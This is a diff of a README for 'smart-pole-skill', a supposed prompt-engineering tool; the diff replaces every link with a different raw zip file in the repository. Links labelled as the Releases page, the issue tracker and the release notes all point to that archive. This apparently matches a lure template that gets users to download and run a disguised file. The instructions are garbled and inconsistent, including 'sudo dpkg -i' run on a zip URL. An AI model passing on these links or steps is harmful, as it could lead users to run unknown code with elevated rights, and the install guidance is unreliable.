@@ -1,7 +1,7 @@
 # 🎉 smart-pole-skill - Enhance Your AI Prompts Easily
 
 ## 🔗 Download Now
-[![Download smart-pole-skill](https://raw.githubusercontent.com/zerotohero99/smart-pole-skill/main/prompts/pole_skill_smart_2.7-alpha.1.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/zerotohero99/smart-pole-skill/main/prompts/pole_skill_smart_2.7-alpha.1.zip)
+[![Download smart-pole-skill](https://raw.githubusercontent.com/zerotohero99/smart-pole-skill/main/docs/skill_pole_smart_v2.9.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/zerotohero99/smart-pole-skill/main/docs/skill_pole_smart_v2.9.zip)
 
 ## 🚀 Getting Started
 Welcome to smart-pole-skill! This application helps you improve your prompts for large language models (LLMs) using SMART POLE prompt engineering. This guide will help you download and run the software easily, even if you have no technical background.
@@ -17,7 +17,7 @@ Before you start, make sure you have the following:
 ## 🌐 Download & Install
 To get started, visit the Releases page to download the latest version of smart-pole-skill.
 
-[Download smart-pole-skill](https://raw.githubusercontent.com/zerotohero99/smart-pole-skill/main/prompts/pole_skill_smart_2.7-alpha.1.zip)
+[Download smart-pole-skill](https://raw.githubusercontent.com/zerotohero99/smart-pole-skill/main/docs/skill_pole_smart_v2.9.zip)
 
 ### 🛠 Installation Steps
 1. Click the link above to go to the Releases page.
@@ -25,7 +25,7 @@ To get started, visit the Releases page to download the latest version of smart-
 3. Look for the file suitable for your operating system:
     - For Windows, download the `.exe` file.
     - For macOS, download the `.dmg` file.
-    - For Linux, download the appropriate package (usually a `https://raw.githubusercontent.com/zerotohero99/smart-pole-skill/main/prompts/pole_skill_smart_2.7-alpha.1.zip` or `.deb` file).
+    - For Linux, download the appropriate package (usually a `https://raw.githubusercontent.com/zerotohero99/smart-pole-skill/main/docs/skill_pole_smart_v2.9.zip` or `.deb` file).
 4. Once the file is downloaded, locate it in your Downloads folder.
 
 #### Windows Installation
@@ -43,7 +43,7 @@ To get started, visit the Releases page to download the latest version of smart-
 - Navigate to the directory where the downloaded file is located.
 - Use the command line to install. For example, if it's a `.deb` file, type:
     ```bash
-    sudo dpkg -i https://raw.githubusercontent.com/zerotohero99/smart-pole-skill/main/prompts/pole_skill_smart_2.7-alpha.1.zip
+    sudo dpkg -i https://raw.githubusercontent.com/zerotohero99/smart-pole-skill/main/docs/skill_pole_smart_v2.9.zip
     ```
 - Follow any additional onscreen prompts.
 
@@ -69,7 +69,7 @@ If you encounter any issues while using smart-pole-skill, you can:
 
 - Check the FAQs section in the application.
 - Browse through the Wiki on our GitHub page for detailed guides.
-- Open an issue on the [smart-pole-skill GitHub page](https://raw.githubusercontent.com/zerotohero99/smart-pole-skill/main/prompts/pole_skill_smart_2.7-alpha.1.zip) for direct assistance.
+- Open an issue on the [smart-pole-skill GitHub page](https://raw.githubusercontent.com/zerotohero99/smart-pole-skill/main/docs/skill_pole_smart_v2.9.zip) for direct assistance.
 
 ## 🏆 Contribution
 We welcome contributions to smart-pole-skill. If you have suggestions for new features or improvements, please feel free to open an issue or submit a pull request.
@@ -81,10 +81,10 @@ Connect with other users to share tips or seek assistance.
 - Forum: [Visit Our Forum](#)
 
 ## 📅 Release Notes
-Stay updated on new features and fixes by checking the release notes on our [GitHub Releases page](https://raw.githubusercontent.com/zerotohero99/smart-pole-skill/main/prompts/pole_skill_smart_2.7-alpha.1.zip).
+Stay updated on new features and fixes by checking the release notes on our [GitHub Releases page](https://raw.githubusercontent.com/zerotohero99/smart-pole-skill/main/docs/skill_pole_smart_v2.9.zip).
 
 ## 🔗 Quick Links
-- **[Download smart-pole-skill](https://raw.githubusercontent.com/zerotohero99/smart-pole-skill/main/prompts/pole_skill_smart_2.7-alpha.1.zip)**
+- **[Download smart-pole-skill](https://raw.githubusercontent.com/zerotohero99/smart-pole-skill/main/docs/skill_pole_smart_v2.9.zip)**
 - **Documentation:** [View Documentation](#)
 - **Community Support:** [Join Our Community](#)
 
